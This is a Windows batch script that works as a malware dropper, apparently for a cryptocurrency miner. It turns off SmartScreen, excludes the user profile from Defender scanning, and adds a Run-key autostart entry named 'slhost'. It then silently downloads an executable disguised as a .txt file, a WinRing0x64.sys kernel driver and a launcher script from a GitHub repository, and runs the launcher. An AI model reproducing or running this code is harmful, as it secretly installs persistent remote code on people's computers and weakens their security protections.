@echo off

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f /v EnableSmartScreen /t REG_DWORD /d 0 >nul 2>&1 
powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  >nul 2>&1 

mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 

powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')" >nul 2>&1 
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/WinRing0x64.sys','%USERPROFILE%\.cache\services\slhost\WinRing0x64.sys')" >nul 2>&1 
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.default.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')" >nul 2>&1 
 
%USERPROFILE%\.cache\services\slhost\Noise.bat
